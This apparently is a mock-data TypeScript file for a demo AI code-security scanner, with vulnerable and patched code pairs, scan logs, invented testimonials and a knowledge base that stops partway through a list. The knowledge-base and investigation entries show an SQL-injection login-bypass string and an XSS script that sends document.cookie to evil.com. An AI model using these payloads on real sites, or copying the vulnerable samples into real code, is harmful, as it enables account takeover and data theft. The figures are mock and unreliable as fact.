// ── Mock Data for Agent Phantom ──

export interface Vulnerability {
  id: string;
  title: string;
  severity: "critical" | "high" | "medium" | "low";
  confidence: number;
  file: string;
  line: number;
  description: string;
  impact: string;
  explanation: string;
  owasp: string;
  cwe: string;
  vulnerableCode: string;
  fixedCode: string;
  fixExplanation: string;
  riskReduction: number;
}

export interface ScanResult {
  id: string;
  repository: string;
  status: "completed" | "in-progress" | "queued" | "failed";
  threats: number;
  date: string;
  duration: string;
  filesAnalyzed: number;
  scoreBefore: number;
  scoreAfter: number;
}

export interface ActivityItem {
  id: string;
  message: string;
  type: "detection" | "fix" | "report" | "scan" | "improvement";
  timestamp: string;
}

export const vulnerabilities: Vulnerability[] = [
  {
    id: "vuln-001",
    title: "SQL Injection in User Authentication",
    severity: "critical",
    confidence: 98,
    file: "src/api/users.ts",
    line: 47,
    description: "User input is directly concatenated into SQL query without parameterization, allowing arbitrary SQL execution.",
    impact: "An attacker can bypass authentication, extract sensitive data, modify or delete database contents, and potentially execute system commands.",
    explanation: "The login function constructs a SQL query by directly embedding user-supplied email and password values into the query string. This allows an attacker to inject malicious SQL code through the input fields.",
    owasp: "A03:2021 - Injection",
    cwe: "CWE-89",
    vulnerableCode: `async function loginUser(email: string, password: string) {
  // VULNERABLE: Direct string concatenation
  const query = \`SELECT * FROM users 
    WHERE email = '\${email}' 
    AND password = '\${password}'\`;
  
  const result = await db.execute(query);
  return result.rows[0];
}`,
    fixedCode: `async function loginUser(email: string, password: string) {
  // FIXED: Parameterized query prevents SQL injection
  const query = 'SELECT * FROM users WHERE email = $1 AND password_hash = $2';
  const hashedPassword = await bcrypt.hash(password, 12);
  
  const result = await db.execute(query, [email, hashedPassword]);
  return result.rows[0];
}`,
    fixExplanation: "The fix uses parameterized queries ($1, $2) instead of string concatenation, which separates SQL logic from data. Additionally, passwords are now hashed using bcrypt before comparison.",
    riskReduction: 95,
  },
  {
    id: "vuln-002",
    title: "Cross-Site Scripting (XSS) in Comment Renderer",
    severity: "high",
    confidence: 94,
    file: "src/components/Comment.tsx",
    line: 23,
    description: "User-generated content is rendered using dangerouslySetInnerHTML without sanitization.",
    impact: "Attackers can inject malicious scripts that execute in other users' browsers, potentially stealing session tokens, credentials, or performing actions on behalf of victims.",
    explanation: "The Comment component renders user-submitted HTML content directly into the DOM using React's dangerouslySetInnerHTML prop without any sanitization, enabling stored XSS attacks.",
    owasp: "A03:2021 - Injection",
    cwe: "CWE-79",
    vulnerableCode: `function Comment({ content }: { content: string }) {
  // VULNERABLE: Unsanitized HTML rendering
  return (
    <div 
      className="comment-body"
      dangerouslySetInnerHTML={{ __html: content }}
    />
  );
}`,
    fixedCode: `import DOMPurify from 'dompurify';

function Comment({ content }: { content: string }) {
  // FIXED: Sanitize HTML before rendering
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
  
  return (
    <div 
      className="comment-body"
      dangerouslySetInnerHTML={{ __html: sanitizedContent }}
    />
  );
}`,
    fixExplanation: "The fix implements DOMPurify to sanitize user input before rendering, allowing only a whitelist of safe HTML tags and attributes.",
    riskReduction: 90,
  },
  {
    id: "vuln-003",
    title: "Hardcoded API Secret in Production Config",
    severity: "critical",
    confidence: 99,
    file: ".env.production",
    line: 8,
    description: "API secret key is hardcoded in a production environment file that may be committed to version control.",
    impact: "Exposed API keys can be used to impersonate the application, access paid services, or gain unauthorized access to external systems.",
    explanation: "The production environment file contains a hardcoded Stripe API secret key. If this file is committed to version control, the key is exposed to anyone with repository access.",
    owasp: "A02:2021 - Cryptographic Failures",
    cwe: "CWE-798",
    vulnerableCode: `# .env.production
DATABASE_URL=postgresql://prod-db:5432/app
REDIS_URL=redis://prod-cache:6379

# VULNERABLE: Hardcoded secret
STRIPE_SECRET_KEY=sk_live_51HG7d2CjzK...Rp8q
JWT_SECRET=super-secret-jwt-key-2024
SENDGRID_API_KEY=SG.xxxx.yyyy`,
    fixedCode: `# .env.production
DATABASE_URL=\${DATABASE_URL}
REDIS_URL=\${REDIS_URL}

# FIXED: Reference secrets from vault/environment
STRIPE_SECRET_KEY=\${STRIPE_SECRET_KEY}
JWT_SECRET=\${JWT_SECRET}
SENDGRID_API_KEY=\${SENDGRID_API_KEY}

# Secrets are injected via:
# - CI/CD environment variables
# - AWS Secrets Manager / HashiCorp Vault
# - Kubernetes Secrets`,
    fixExplanation: "Secrets are replaced with environment variable references. Actual values are injected at runtime through a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault) or CI/CD pipeline environment variables.",
    riskReduction: 98,
  },
  {
    id: "vuln-004",
    title: "Weak Password Hashing Algorithm",
    severity: "medium",
    confidence: 87,
    file: "src/auth/hash.ts",
    line: 12,
    description: "Passwords are hashed using MD5, which is cryptographically broken and unsuitable for password storage.",
    impact: "MD5 hashes can be reversed using rainbow tables or brute force in seconds, exposing user passwords in case of a database breach.",
    explanation: "The password hashing function uses the MD5 algorithm without salting. MD5 is computationally fast and vulnerable to rainbow table attacks, making it unsuitable for password storage.",
    owasp: "A02:2021 - Cryptographic Failures",
    cwe: "CWE-328",
    vulnerableCode: `import crypto from 'crypto';

function hashPassword(password: string): string {
  // VULNERABLE: MD5 is broken for password hashing
  return crypto
    .createHash('md5')
    .update(password)
    .digest('hex');
}`,
    fixedCode: `import bcrypt from 'bcryptjs';

async function hashPassword(password: string): Promise<string> {
  // FIXED: bcrypt with cost factor 12
  const salt = await bcrypt.genSalt(12);
  return bcrypt.hash(password, salt);
}

async function verifyPassword(
  password: string, 
  hash: string
): Promise<boolean> {
  return bcrypt.compare(password, hash);
}`,
    fixExplanation: "The fix replaces MD5 with bcrypt, which is specifically designed for password hashing. Bcrypt includes automatic salting and a configurable cost factor that makes brute force attacks computationally expensive.",
    riskReduction: 85,
  },
  {
    id: "vuln-005",
    title: "Missing Authorization Check on Admin Endpoint",
    severity: "high",
    confidence: 91,
    file: "src/api/admin.ts",
    line: 31,
    description: "The admin user management endpoint lacks authorization middleware, allowing any authenticated user to perform admin actions.",
    impact: "Any authenticated user can access admin functionalities including user deletion, role changes, and system configuration modifications.",
    explanation: "The DELETE /api/admin/users/:id endpoint only checks if the request has a valid JWT token but does not verify if the authenticated user has admin privileges.",
    owasp: "A01:2021 - Broken Access Control",
    cwe: "CWE-862",
    vulnerableCode: `// VULNERABLE: No role check
router.delete('/api/admin/users/:id', 
  authMiddleware, // Only checks if logged in
  async (req, res) => {
    const userId = req.params.id;
    await db.users.delete(userId);
    res.json({ success: true });
  }
);`,
    fixedCode: `// FIXED: Role-based access control
router.delete('/api/admin/users/:id',
  authMiddleware,
  requireRole('admin'), // Verifies admin role
  validateParams(userIdSchema),
  async (req, res) => {
    const userId = req.params.id;
    
    // Prevent self-deletion
    if (userId === req.user.id) {
      return res.status(403).json({ 
        error: 'Cannot delete own account' 
      });
    }
    
    await db.users.delete(userId);
    auditLog.record('user.deleted', { 
      deletedBy: req.user.id, targetUser: userId 
    });
    res.json({ success: true });
  }
);`,
    fixExplanation: "The fix adds a requireRole('admin') middleware that verifies the authenticated user has admin privileges. It also adds input validation, self-deletion prevention, and audit logging.",
    riskReduction: 92,
  },
];

export const recentScans: ScanResult[] = [
  {
    id: "scan-001",
    repository: "acme/web-platform",
    status: "completed",
    threats: 5,
    date: "2025-01-15",
    duration: "2m 34s",
    filesAnalyzed: 847,
    scoreBefore: 42,
    scoreAfter: 91,
  },
  {
    id: "scan-002",
    repository: "acme/mobile-api",
    status: "completed",
    threats: 3,
    date: "2025-01-14",
    duration: "1m 52s",
    filesAnalyzed: 423,
    scoreBefore: 67,
    scoreAfter: 94,
  },
  {
    id: "scan-003",
    repository: "acme/payment-service",
    status: "in-progress",
    threats: 0,
    date: "2025-01-15",
    duration: "—",
    filesAnalyzed: 156,
    scoreBefore: 78,
    scoreAfter: 0,
  },
  {
    id: "scan-004",
    repository: "acme/auth-microservice",
    status: "completed",
    threats: 7,
    date: "2025-01-13",
    duration: "3m 12s",
    filesAnalyzed: 312,
    scoreBefore: 35,
    scoreAfter: 88,
  },
  {
    id: "scan-005",
    repository: "acme/data-pipeline",
    status: "queued",
    threats: 0,
    date: "2025-01-15",
    duration: "—",
    filesAnalyzed: 0,
    scoreBefore: 0,
    scoreAfter: 0,
  },
];

export const activityFeed: ActivityItem[] = [
  {
    id: "act-001",
    message: "SQL Injection detected in src/api/users.ts",
    type: "detection",
    timestamp: "2 minutes ago",
  },
  {
    id: "act-002",
    message: "Secure patch generated for authentication flow",
    type: "fix",
    timestamp: "5 minutes ago",
  },
  {
    id: "act-003",
    message: "Security score improved from 42 to 91",
    type: "improvement",
    timestamp: "8 minutes ago",
  },
  {
    id: "act-004",
    message: "Hardcoded secrets found in .env.production",
    type: "detection",
    timestamp: "12 minutes ago",
  },
  {
    id: "act-005",
    message: "Security report generated for acme/web-platform",
    type: "report",
    timestamp: "15 minutes ago",
  },
  {
    id: "act-006",
    message: "Deep scan initiated for acme/payment-service",
    type: "scan",
    timestamp: "18 minutes ago",
  },
  {
    id: "act-007",
    message: "XSS vulnerability patched in Comment component",
    type: "fix",
    timestamp: "22 minutes ago",
  },
  {
    id: "act-008",
    message: "Missing authorization check identified in admin API",
    type: "detection",
    timestamp: "25 minutes ago",
  },
];

export const scanLogLines = [
  { text: "$ phantom-scan --mode deep --target acme/web-platform", delay: 0 },
  { text: "", delay: 200 },
  { text: "[INIT] Agent Phantom v3.2.1 initialized", delay: 400 },
  { text: "[INIT] AI Model: Qwen 3 480B loaded", delay: 700 },
  { text: "[INIT] Security rules database: 14,832 rules", delay: 1000 },
  { text: "", delay: 1200 },
  { text: "[LOAD] Cloning repository...", delay: 1400 },
  { text: "[LOAD] Repository loaded: 847 files, 124,563 LOC", delay: 2200 },
  { text: "[LOAD] Detected languages: TypeScript, JavaScript, SQL", delay: 2600 },
  { text: "[LOAD] Package manager: npm (package.json found)", delay: 2900 },
  { text: "", delay: 3100 },
  { text: "[SCAN] Phase 1: Static Analysis", delay: 3300 },
  { text: "[SCAN] Parsing AST for 847 files...", delay: 3600 },
  { text: "[SCAN] ████████████████████████████████ 100%", delay: 5000 },
  { text: "[SCAN] AST parsing complete: 12,847 nodes analyzed", delay: 5200 },
  { text: "", delay: 5400 },
  { text: "[SCAN] Phase 2: Dependency Analysis", delay: 5600 },
  { text: "[SCAN] Analyzing 234 dependencies...", delay: 5900 },
  { text: "[WARN] 3 dependencies have known CVEs", delay: 6400 },
  { text: "[SCAN] Dependency tree depth: 7 levels", delay: 6700 },
  { text: "", delay: 6900 },
  { text: "[SCAN] Phase 3: Data Flow Analysis", delay: 7100 },
  { text: "[SCAN] Tracing data flows across 156 entry points...", delay: 7400 },
  { text: "[SCAN] Analyzing authentication flows...", delay: 8000 },
  { text: "[CRIT] ⚠ SQL Injection found: src/api/users.ts:47", delay: 8500 },
  { text: "[HIGH] ⚠ XSS vulnerability: src/components/Comment.tsx:23", delay: 9000 },
  { text: "[CRIT] ⚠ Hardcoded secrets: .env.production:8", delay: 9500 },
  { text: "[MED]  ⚠ Weak hashing: src/auth/hash.ts:12", delay: 10000 },
  { text: "[HIGH] ⚠ Missing auth check: src/api/admin.ts:31", delay: 10500 },
  { text: "", delay: 10700 },
  { text: "[SCAN] Phase 4: AI-Powered Remediation", delay: 10900 },
  { text: "[FIX]  Generating secure patches...", delay: 11200 },
  { text: "[FIX]  Patch 1/5: Parameterized query for SQL injection", delay: 11800 },
  { text: "[FIX]  Patch 2/5: DOMPurify sanitization for XSS", delay: 12300 },
  { text: "[FIX]  Patch 3/5: Environment variable references for secrets", delay: 12800 },
  { text: "[FIX]  Patch 4/5: bcrypt migration for password hashing", delay: 13300 },
  { text: "[FIX]  Patch 5/5: RBAC middleware for admin endpoints", delay: 13800 },
  { text: "", delay: 14000 },
  { text: "[DONE] Scan complete: 5 vulnerabilities found", delay: 14200 },
  { text: "[DONE] Security score: 42 → 91 (with recommended fixes)", delay: 14500 },
  { text: "[DONE] Full report available at /report", delay: 14800 },
];

export const threatDistribution = [
  { name: "Critical", value: 2, color: "#EF4444" },
  { name: "High", value: 2, color: "#F97316" },
  { name: "Medium", value: 1, color: "#EAB308" },
  { name: "Low", value: 0, color: "#3B82F6" },
];

export const dashboardStats = {
  repositoriesScanned: 1247,
  filesAnalyzed: 89432,
  vulnerabilitiesFound: 3891,
  securityScore: 89,
};

export const landingStats = {
  repositoriesAnalyzed: 50000,
  threatsDetected: 234000,
  reportsGenerated: 12000,
};

export const features = [
  {
    title: "AI Vulnerability Detection",
    description: "Deep neural networks analyze your code for zero-day vulnerabilities, logic flaws, and security anti-patterns.",
    icon: "Shield" as const,
  },
  {
    title: "Automated Remediation",
    description: "AI generates production-ready security patches with explanations, preserving your code style and architecture.",
    icon: "Wrench" as const,
  },
  {
    title: "Security Reporting",
    description: "Executive-grade reports with OWASP mapping, risk scores, and compliance-ready documentation.",
    icon: "FileText" as const,
  },
  {
    title: "Repository Analysis",
    description: "Full-stack scanning of dependencies, data flows, authentication paths, and infrastructure configs.",
    icon: "GitBranch" as const,
  },
  {
    title: "Threat Prioritization",
    description: "AI-powered risk scoring ranks vulnerabilities by exploitability, blast radius, and business impact.",
    icon: "AlertTriangle" as const,
  },
  {
    title: "Code Diff Generation",
    description: "Side-by-side comparison of vulnerable and patched code with syntax highlighting and annotations.",
    icon: "Code" as const,
  },
];

export const testimonials = [
  {
    name: "Sarah Chen",
    role: "CISO, TechCorp",
    quote: "Agent Phantom reduced our vulnerability remediation time by 87%. It's like having a senior security engineer that never sleeps.",
    avatar: "SC",
  },
  {
    name: "Marcus Rodriguez",
    role: "VP Engineering, FinServe",
    quote: "The AI-generated patches are production-quality. We've integrated Agent Phantom into our CI/CD pipeline and it catches issues before they reach staging.",
    avatar: "MR",
  },
  {
    name: "Dr. Aisha Patel",
    role: "Security Lead, CloudScale",
    quote: "Finally, a security tool that developers actually want to use. The UX is incredible and the remediation suggestions are contextually aware.",
    avatar: "AP",
  },
];

export const howItWorks = [
  { step: 1, title: "Upload Repository", description: "Drop your repository ZIP or connect your Git provider." },
  { step: 2, title: "AI Analysis", description: "Our AI engine performs deep static and dynamic analysis." },
  { step: 3, title: "Vulnerability Detection", description: "Threats are identified, classified, and prioritized." },
  { step: 4, title: "Patch Generation", description: "AI generates secure, context-aware code fixes." },
  { step: 5, title: "Security Report", description: "Get an executive report with scores and recommendations." },
];

// ── Investigation Timeline ──

export interface InvestigationStep {
  id: string;
  title: string;
  timestamp: string;
  status: "completed" | "in-progress" | "pending";
  confidence: number;
  duration: string;
  filesInspected: string[];
  reasoning: string;
  findings: string;
  codeSnippet?: string;
}

export const investigationSteps: InvestigationStep[] = [
  {
    id: "inv-01",
    title: "Repository Loaded",
    timestamp: "00:00.0s",
    status: "completed",
    confidence: 100,
    duration: "1.2s",
    filesInspected: ["package.json", "tsconfig.json", ".gitignore"],
    reasoning: "Loaded repository manifest and configuration files to determine project structure, language, and dependency manager.",
    findings: "Next.js 14 project with TypeScript. 847 files, 124,563 LOC. npm package manager with 234 dependencies.",
    codeSnippet: `// package.json (excerpt)
{
  "name": "acme-web-platform",
  "dependencies": {
    "next": "14.1.0",
    "pg": "8.11.3",
    "bcryptjs": "2.4.3"
  }
}`,
  },
  {
    id: "inv-02",
    title: "Repository Structure Analyzed",
    timestamp: "00:01.2s",
    status: "completed",
    confidence: 100,
    duration: "2.1s",
    filesInspected: ["src/", "src/api/", "src/auth/", "src/components/", "config/"],
    reasoning: "Mapped directory tree to identify entry points, API routes, authentication modules, and configuration files.",
    findings: "4 API endpoints, 2 auth modules, 12 React components, 1 production env file. Standard Next.js App Router structure.",
  },
  {
    id: "inv-03",
    title: "Authentication Flows Mapped",
    timestamp: "00:03.3s",
    status: "completed",
    confidence: 96,
    duration: "3.8s",
    filesInspected: ["src/api/users.ts", "src/auth/login.ts", "src/auth/hash.ts"],
    reasoning: "Traced authentication data flow from login form → API handler → database query. Checking for input sanitization, parameterized queries, and secure hashing at each boundary.",
    findings: "Login flow accepts raw user input and passes it directly to SQL query construction. Password hashing uses MD5 without salting.",
    codeSnippet: `// src/api/users.ts:47 — data flow trace
loginForm.email → req.body.email → query string interpolation
loginForm.password → req.body.password → query string interpolation
// No sanitization, no parameterization detected`,
  },
  {
    id: "inv-04",
    title: "Database Queries Traced",
    timestamp: "00:07.1s",
    status: "completed",
    confidence: 98,
    duration: "2.4s",
    filesInspected: ["src/api/users.ts", "src/api/admin.ts"],
    reasoning: "Analyzed all database interaction points. Looking for string concatenation in SQL queries, ORM misuse, and raw query execution without parameterization.",
    findings: "2 raw SQL queries found using template literal interpolation. Both accept unsanitized user input directly.",
    codeSnippet: `// TAINTED DATA FLOW
const query = \`SELECT * FROM users 
  WHERE email = '\${email}'\`; // ← user input
// email is never sanitized or parameterized`,
  },
  {
    id: "inv-05",
    title: "Input Validation Checked",
    timestamp: "00:09.5s",
    status: "completed",
    confidence: 94,
    duration: "1.9s",
    filesInspected: ["src/api/users.ts", "src/api/admin.ts", "src/components/Comment.tsx"],
    reasoning: "Checking all user-facing input points for validation, sanitization, encoding, and escaping. Looking for XSS vectors, injection points, and unsafe DOM manipulation.",
    findings: "No input validation middleware found. Comment component uses dangerouslySetInnerHTML with raw user content. Admin endpoint accepts unvalidated route parameters.",
  },
  {
    id: "inv-06",
    title: "Potential SQL Injection Found",
    timestamp: "00:11.4s",
    status: "completed",
    confidence: 98,
    duration: "0.8s",
    filesInspected: ["src/api/users.ts"],
    reasoning: "Confirmed that user-controlled input (email, password) flows into SQL query via string interpolation without any sanitization barrier. Classic CWE-89 pattern.",
    findings: "HIGH CONFIDENCE SQL Injection at src/api/users.ts:47. Attack vector: authentication bypass via email field. Impact: Full database access.",
    codeSnippet: `// PROOF OF CONCEPT
// Input: email = "' OR '1'='1' --"
// Resulting query:
SELECT * FROM users 
  WHERE email = '' OR '1'='1' --' 
  AND password = '...'
// → Returns first user row (admin bypass)`,
  },
  {
    id: "inv-07",
    title: "Exploitability Verified",
    timestamp: "00:12.2s",
    status: "completed",
    confidence: 98,
    duration: "1.5s",
    filesInspected: ["src/api/users.ts", "src/auth/login.ts"],
    reasoning: "Simulated attack scenarios to verify exploitability. Confirmed that no WAF, rate limiting, or input filtering exists between user input and query execution.",
    findings: "Vulnerability is directly exploitable. No compensating controls detected. CVSS: 9.8 (Critical). Authentication bypass confirmed viable.",
  },
  {
    id: "inv-08",
    title: "Vulnerability Confirmed",
    timestamp: "00:13.7s",
    status: "completed",
    confidence: 99,
    duration: "0.5s",
    filesInspected: ["src/api/users.ts", "src/components/Comment.tsx", ".env.production", "src/auth/hash.ts", "src/api/admin.ts"],
    reasoning: "Cross-referenced all findings. 5 confirmed vulnerabilities across injection, cryptographic failures, and access control categories.",
    findings: "5 vulnerabilities confirmed: 2 Critical (SQLi, hardcoded secrets), 2 High (XSS, missing authz), 1 Medium (weak hashing). All have AI-generated patches ready.",
  },
  {
    id: "inv-09",
    title: "Patch Generated",
    timestamp: "00:14.2s",
    status: "completed",
    confidence: 97,
    duration: "3.2s",
    filesInspected: ["src/api/users.ts", "src/components/Comment.tsx", ".env.production", "src/auth/hash.ts", "src/api/admin.ts"],
    reasoning: "Generated context-aware patches for each vulnerability. Ensured patches maintain existing code style, function signatures, and test compatibility.",
    findings: "5 patches generated. Estimated security score improvement: 42 → 91. All patches preserve backward compatibility.",
  },
  {
    id: "inv-10",
    title: "Security Report Generated",
    timestamp: "00:17.4s",
    status: "completed",
    confidence: 100,
    duration: "1.1s",
    filesInspected: [],
    reasoning: "Compiled executive summary with OWASP mapping, CWE references, risk scores, and remediation recommendations.",
    findings: "Full security report generated. 5 vulnerabilities documented with severity ratings, OWASP/CWE mappings, and AI-generated patches.",
  },
];

export const agentReasoning = {
  currentFocus: "Authentication Module",
  currentHypothesis: "User-controlled input reaches SQL query without sanitization, enabling authentication bypass via SQL injection.",
  evidenceCollected: [
    "Template literal interpolation in database query (src/api/users.ts:47)",
    "No input validation middleware on login route",
    "No parameterized query usage detected",
    "Password compared as plaintext in query (no pre-hashing)",
    "No WAF or rate limiting on authentication endpoint",
  ],
  confidence: 98,
  nextAction: "Generate Secure Patch",
  model: "Qwen 3 480B",
  tokensUsed: 24847,
  reasoningSteps: 156,
};

// ── Repository File Tree ──

export interface FileTreeNode {
  name: string;
  type: "file" | "folder";
  children?: FileTreeNode[];
  language?: string;
  vulnerabilities?: { severity: "critical" | "high" | "medium" | "low"; line: number }[];
}

export const repositoryTree: FileTreeNode = {
  name: "acme-web-platform",
  type: "folder",
  children: [
    {
      name: "src",
      type: "folder",
      children: [
        {
          name: "api",
          type: "folder",
          children: [
            { name: "users.ts", type: "file", language: "typescript", vulnerabilities: [{ severity: "critical", line: 47 }] },
            { name: "admin.ts", type: "file", language: "typescript", vulnerabilities: [{ severity: "high", line: 31 }] },
            { name: "products.ts", type: "file", language: "typescript" },
            { name: "health.ts", type: "file", language: "typescript" },
          ],
        },
        {
          name: "auth",
          type: "folder",
          children: [
            { name: "login.ts", type: "file", language: "typescript" },
            { name: "hash.ts", type: "file", language: "typescript", vulnerabilities: [{ severity: "medium", line: 12 }] },
            { name: "middleware.ts", type: "file", language: "typescript" },
            { name: "session.ts", type: "file", language: "typescript" },
          ],
        },
        {
          name: "components",
          type: "folder",
          children: [
            { name: "Comment.tsx", type: "file", language: "tsx", vulnerabilities: [{ severity: "high", line: 23 }] },
            { name: "Header.tsx", type: "file", language: "tsx" },
            { name: "Footer.tsx", type: "file", language: "tsx" },
            { name: "UserProfile.tsx", type: "file", language: "tsx" },
            { name: "Dashboard.tsx", type: "file", language: "tsx" },
          ],
        },
        {
          name: "lib",
          type: "folder",
          children: [
            { name: "db.ts", type: "file", language: "typescript" },
            { name: "utils.ts", type: "file", language: "typescript" },
            { name: "validators.ts", type: "file", language: "typescript" },
          ],
        },
        {
          name: "styles",
          type: "folder",
          children: [
            { name: "globals.css", type: "file", language: "css" },
            { name: "theme.css", type: "file", language: "css" },
          ],
        },
      ],
    },
    {
      name: "config",
      type: "folder",
      children: [
        { name: ".env.production", type: "file", language: "env", vulnerabilities: [{ severity: "critical", line: 8 }] },
        { name: ".env.example", type: "file", language: "env" },
        { name: "next.config.js", type: "file", language: "javascript" },
      ],
    },
    { name: "package.json", type: "file", language: "json" },
    { name: "tsconfig.json", type: "file", language: "json" },
    { name: "README.md", type: "file", language: "markdown" },
  ],
};

export const fileContents: Record<string, string> = {
  "src/api/users.ts": `import { db } from '../lib/db';
import { NextRequest, NextResponse } from 'next/server';

interface LoginRequest {
  email: string;
  password: string;
}

// GET /api/users - List all users
export async function GET() {
  const users = await db.query('SELECT id, email, name FROM users');
  return NextResponse.json(users.rows);
}

// POST /api/users - Create new user
export async function POST(req: NextRequest) {
  const { email, password, name } = await req.json();
  
  const existingUser = await db.query(
    'SELECT id FROM users WHERE email = $1',
    [email]
  );
  
  if (existingUser.rows.length > 0) {
    return NextResponse.json(
      { error: 'User already exists' },
      { status: 409 }
    );
  }
  
  const result = await db.query(
    'INSERT INTO users (email, password, name) VALUES ($1, $2, $3) RETURNING id',
    [email, password, name]
  );
  
  return NextResponse.json({ id: result.rows[0].id }, { status: 201 });
}

// POST /api/users/login - Authenticate user
export async function loginUser(email: string, password: string) {
  // VULNERABLE: Direct string concatenation
  const query = \`SELECT * FROM users 
    WHERE email = '\${email}' 
    AND password = '\${password}'\`;
  
  const result = await db.execute(query);
  return result.rows[0];
}

// POST /api/users/profile - Update profile
export async function updateProfile(userId: string, data: any) {
  const { name, bio } = data;
  await db.query(
    'UPDATE users SET name = $1, bio = $2 WHERE id = $3',
    [name, bio, userId]
  );
}`,
  "src/components/Comment.tsx": `import React from 'react';

interface CommentProps {
  id: string;
  author: string;
  content: string;
  createdAt: string;
  likes: number;
}

// Comment component - renders user-submitted comments
export default function Comment({ 
  id, 
  author, 
  content, 
  createdAt, 
  likes 
}: CommentProps) {
  return (
    <div className="comment-card" data-id={id}>
      <div className="comment-header">
        <span className="author">{author}</span>
        <span className="date">{createdAt}</span>
      </div>
      {/* VULNERABLE: Unsanitized HTML rendering */}
      <div 
        className="comment-body"
        dangerouslySetInnerHTML={{ __html: content }}
      />
      <div className="comment-footer">
        <button className="like-btn">
          ♥ {likes}
        </button>
        <button className="reply-btn">Reply</button>
      </div>
    </div>
  );
}`,
  "src/auth/hash.ts": `import crypto from 'crypto';

// Password hashing utilities
const SALT_ROUNDS = 10;

export function generateSalt(): string {
  return crypto.randomBytes(16).toString('hex');
}

export function hashPassword(password: string): string {
  // VULNERABLE: MD5 is broken for password hashing
  return crypto
    .createHash('md5')
    .update(password)
    .digest('hex');
}

export function verifyPassword(
  password: string, 
  hash: string
): boolean {
  const inputHash = hashPassword(password);
  return inputHash === hash;
}

export function generateToken(): string {
  return crypto.randomBytes(32).toString('hex');
}`,
  "src/api/admin.ts": `import { Router } from 'express';
import { db } from '../lib/db';
import { authMiddleware } from '../auth/middleware';

const router = Router();

// GET /api/admin/users - List all users (admin)
router.get('/api/admin/users',
  authMiddleware,
  async (req, res) => {
    const users = await db.query(
      'SELECT id, email, name, role, created_at FROM users ORDER BY created_at DESC'
    );
    res.json(users.rows);
  }
);

// GET /api/admin/stats - Dashboard stats
router.get('/api/admin/stats',
  authMiddleware,
  async (req, res) => {
    const userCount = await db.query('SELECT COUNT(*) FROM users');
    const activeCount = await db.query(
      "SELECT COUNT(*) FROM users WHERE last_login > NOW() - INTERVAL '30 days'"
    );
    res.json({
      totalUsers: userCount.rows[0].count,
      activeUsers: activeCount.rows[0].count,
    });
  }
);

// VULNERABLE: No role check
router.delete('/api/admin/users/:id', 
  authMiddleware, // Only checks if logged in
  async (req, res) => {
    const userId = req.params.id;
    await db.users.delete(userId);
    res.json({ success: true });
  }
);

export default router;`,
};

// ── Knowledge Base ──

export interface KnowledgeEntry {
  id: string;
  title: string;
  category: string;
  owasp: string;
  icon: string;
  severity: "critical" | "high" | "medium";
  description: string;
  realWorldImpact: string;
  attackExample: string;
  mitigation: string[];
  bestPractices: string[];
}

export const knowledgeBase: KnowledgeEntry[] = [
  {
    id: "kb-001",
    title: "SQL Injection",
    category: "Injection",
    owasp: "A03:2021",
    icon: "Database",
    severity: "critical",
    description: "SQL Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.",
    realWorldImpact: "In 2017, Equifax suffered a massive breach affecting 147 million consumers due to an unpatched Apache Struts vulnerability that allowed command injection. SQL injection remains the #1 attack vector for data breaches, with average breach costs exceeding $4.45 million.",
    attackExample: `// Malicious input in login form:
email: ' OR '1'='1' --
password: anything

// Resulting SQL query:
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'anything'

// The OR '1'='1' always evaluates to true
// The -- comments out the rest of the query
// Result: Returns the first user (usually admin)`,
    mitigation: [
      "Use parameterized queries (prepared statements) for all database interactions",
      "Implement input validation with strict allowlists for expected data formats",
      "Use ORM frameworks that automatically parameterize queries",
      "Apply the principle of least privilege to database accounts",
      "Deploy a Web Application Firewall (WAF) as an additional defense layer",
    ],
    bestPractices: [
      "Never concatenate user input into SQL strings",
      "Use stored procedures with parameterized inputs",
      "Implement database activity monitoring",
      "Regularly test with automated SQL injection scanners",
      "Escape special characters as a secondary defense",
    ],
  },
  {
    id: "kb-002",
    title: "Cross-Site Scripting (XSS)",
    category: "Injection",
    owasp: "A03:2021",
    icon: "Code",
    severity: "high",
    description: "XSS flaws occur when an application includes untrusted data in a web page without proper validation or escaping. XSS allows attackers to execute scripts in the victim's browser which can hijack user sessions, deface websites, or redirect users to malicious sites.",
    realWorldImpact: "British Airways was fined £20 million after attackers used XSS to inject card-skimming JavaScript on their payment page, compromising 380,000 transactions. XSS is found in approximately 2/3 of all web applications.",
    attackExample: `// Stored XSS in a comment field:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// When other users view the comment,
// their session cookies are sent to the attacker
// enabling full account takeover`,
    mitigation: [
      "Sanitize all user input using libraries like DOMPurify",
      "Implement Content Security Policy (CSP) headers",
      "Use context-aware output encoding (HTML, JavaScript, URL, CSS)",
      "Enable HttpOnly and Secure flags on session cookies",
      "Use React's built-in JSX escaping (avoid dangerouslySetInnerHTML)",
    ],
    bestPractices: [
      "Treat all user input as untrusted",
      "Use template engines with auto-escaping enabled",
      "Implement subresource integrity (SRI) for third-party scripts",
      "Regular security scanning for XSS vulnerabilities",
      "Use modern frameworks that escape output by default",
    ],
  },
  {
    id: "kb-003",
    title: "Hardcoded Secrets",
    category: "Cryptographic Failures",
    owasp: "A02:2021",
    icon: "Key",
    severity: "critical",
    description: "Hardcoded credentials, API keys, and secrets embedded in source code or configuration files can be easily discovered by attackers who gain access to the codebase. These secrets often provide direct access to production systems, databases, and third-party services.",
    realWorldImpact: "Uber's 2016 breach exposed data of 57 million users after attackers found AWS credentials hardcoded in a GitHub repository. Over 100,000 GitHub repositories are estimated to contain exposed API keys at any given time.",
    attackExample: `# Secrets found in .env.production committed to git:
STRIPE_SECRET_KEY=sk_live_51HG7d2CjzK...Rp8q
JWT_SECRET=super-secret-jwt-key-2024
DATABASE_URL=postgresql://admin:P@ssw0rd@prod-db:5432

# Attacker can:
# 1. Process fraudulent payments via Stripe
# 2. Forge authentication tokens via JWT secret
# 3. Access production database directly`,
    mitigation: [
      "Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault)",
      "Inject secrets via CI/CD pipeline environment variables",
      "Add .env files to .gitignore to prevent accidental commits",
      "Use git-secrets or truffleHog to scan for leaked credentials",
      "Rotate all secrets immediately if exposure is detected",
    ],
    bestPractices: [
      "Never store secrets in version control",
